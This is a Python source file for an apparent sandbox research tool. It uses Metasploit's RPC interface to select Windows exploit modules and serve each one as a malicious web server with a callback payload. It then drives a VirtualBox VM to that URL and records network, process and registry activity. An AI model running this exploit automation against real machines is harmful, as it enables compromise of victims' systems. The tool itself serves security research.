import datetime
import logging

from pymetasploit3.msfrpc import MsfRpcClient

from constants import DEFAULT_MS_HOST, DEFAULT_MS_LPORT, DEFAULT_MS_PAYLOAD, DEFAULT_MS_SRVHOST, DEFAULT_MS_SRVPORT, DEFAULT_MS_URIPATH
from data import ScriptArguments, VBoxWorkflowConfiguration
from services import IScriptHandlingService
from services.metasploit.datatype import MaliciousWebServerMetadata, MetasploitClientOptions, MetasploitSearchResult
from services.metasploit.helper import MetasploitHelper
from services.vbox import VirtualBoxService


class MetasploitScriptHandlingService(IScriptHandlingService):
    
    def __init__(self) -> None:
        self._logger = logging.getLogger(__name__)
        self._client: MsfRpcClient | None = None
    
    def execute_script(self, args) -> bool:
        try:
            client_options = MetasploitClientOptions(
                host=args.ms_rpc_host, 
                port=args.ms_rpc_port, 
                password=args.ms_rpc_password,
                ssl=args.ms_rpc_ssl,
                uri=args.ms_rpc_uri
            )
            self._client = MetasploitHelper.create_client(client_options)

            vbox_service = VirtualBoxService(
                user=args.user, 
                password=args.password, 
                base_vm_name=args.vm, 
                vbox_path=args.vbox_path, 
            )

            platform = "windows"
            self._logger.info(f"Getting potential exploits from Metasploit (platform: {platform})...")
            search_results = self._get_exploits(platform=platform, from_date=args.ms_from_date, to_date=args.ms_to_date)
            self._logger.info(f"Found {len(search_results)} exploits.")

            # Filter all unsupported modules
            self._logger.info(f"Filtering out all unsupported modules...")
            final_results: list[MetasploitSearchResult] = []
            for search_result in search_results:
                _, module_path = MetasploitHelper.get_module_type(search_result.fullname)
                module = self._client.modules.use("exploit", module_path)

                if not self._is_supported_module(module.options):
                    self._logger.debug(f"Module {search_result.fullname} cannot automatically deploy as a malicious webserver. Skipping...")
                else:            
                    final_results.append(search_result)
            self._logger.info(f"Found {len(final_results)} potential exploits.")

            # Configure total runs
            results_to_run = final_results
            if args.max_url:
                max_url = int(args.max_url)
                results_to_run = final_results[:max_url]
            self._logger.info(f"Launching {len(results_to_run)} audits...")
            
            # Run audits
            for result in results_to_run:
                server_metadata = self._deploy_malicious_webserver(module_fullname=result.fullname, 
                                                                host=args.ms_host, 
                                                                lport=args.ms_lport,
                                                                srvport=args.ms_srvport,
                                                                payload=args.ms_payload)
                self._logger.info(f"{result.fullname} ({result.disclosuredate}) (Job ID: {server_metadata.job_id}). Server started! Target URL: {server_metadata.url}")
                self._logger.debug(self._client.jobs.info(server_metadata.job_id))

                # Configure options for an audit
                script_args = ScriptArguments(
                    script_path=args.script_path, 
                    target_url=server_metadata.url,
                    duration=args.duration, 
                    output_path=args.output, 
                    interface_num=args.iface, 
                    tshark_fields=args.tshark_fields, 
                    tshark_path=args.tshark_path, 
                    procmon_path=args.procmon_path, 
                    regview_path=args.reg_path, 
                )
                config = VBoxWorkflowConfiguration(
                    snapshot=args.snapshot, 
                    base_host_path= args.base_host_path, 
                    boot_timeout= args.boot_timeout, 
                    execution_timeout= int(args.execution_timeout), 
                    headless= bool(args.headless), 
                    script_args=script_args
                )

                # Run the audit
                success, path = vbox_service.run_workflow(config=config)
                self._logger.info(f"Audit at {path} completed: {'SUCCESS' if success else 'FAILED'}")

                # Stop the web server after the audit completed
                self._client.jobs.stop(server_metadata.job_id)

            return True
        except Exception as e:
            self._logger.error(e)
            return False

    def _deploy_malicious_webserver(self, module_fullname: str, 
                                    host: str = DEFAULT_MS_HOST, lport: int = DEFAULT_MS_LPORT,
                                    srvhost: str = DEFAULT_MS_SRVHOST, srvport: int = DEFAULT_MS_SRVPORT, 
                                    uri_path: str = DEFAULT_MS_URIPATH, payload: str = DEFAULT_MS_PAYLOAD) -> MaliciousWebServerMetadata:
        if self._client is None:
            raise ValueError("Metasploit client not initialized.")
        
        # Configure the exploit
        _, module_path = MetasploitHelper.get_module_type(module_fullname)
        execute_module = self._client.modules.use("exploit", module_path)

        execute_module.update({
            'SRVHOST': srvhost,
            'SRVPORT': srvport,
            'URIPATH': uri_path,
            'VERBOSE': True,
            'DisablePayloadHandler': True,
        })

        # Configure the payload
        payload_module = self._client.modules.use('payload', payload)
        payload_module['LHOST'] = host
        payload_module['LPORT'] = lport

        # Execute the exploit
        execution_result = execute_module.execute(payload=payload_module)

        job_id = execution_result['job_id']
        if job_id is None:
            raise ValueError(f"Failed to execute the exploit {module_fullname} with payload {payload}.")

        return MaliciousWebServerMetadata(
            job_id=job_id,
            url=f"http://{host}:{srvport}{uri_path}",
            host=host,
            port=srvport,
            uri_path=uri_path,
            payload=payload
        )

    def _is_supported_module(self, module_options: list[str]):
        supported_opts = ['SRVHOST', 'SRVPORT', 'URIPATH'] # Requires to deploy webserver automatically
        contains_all_supported_opts = all(option in module_options for option in supported_opts)

        unsupported_opts = ['RHOST', 'RHOSTS', 'RPORT']
        contains_any_unsupported_opts = any(option in module_options for option in unsupported_opts)

        return contains_all_supported_opts and not contains_any_unsupported_opts

    def _get_exploits(self, platform: str = 'windows', from_date: datetime.datetime | None = None, to_date: datetime.datetime | None = None):
        if self._client is None:
            raise ValueError("Metasploit client not initialized.")

        # Search specifically for browser-based exploits
        raw_results = self._client.call('module.search', [f'type:exploit platform:{platform}'])
        results: list[MetasploitSearchResult] = [MetasploitSearchResult(**e) for e in raw_results if type(e) is dict]

        # Sort and filter as before
        sorted_results = sorted(results, key=lambda x: x.disclosuredate, reverse=True)

        # Filter by date if provided
        if from_date is not None:
            sorted_results = [e for e in sorted_results if datetime.datetime.strptime(e.disclosuredate, "%Y-%m-%d") >= from_date]
        if to_date is not None:
            sorted_results = [e for e in sorted_results if datetime.datetime.strptime(e.disclosuredate, "%Y-%m-%d") <= to_date]
                
        return sorted_results
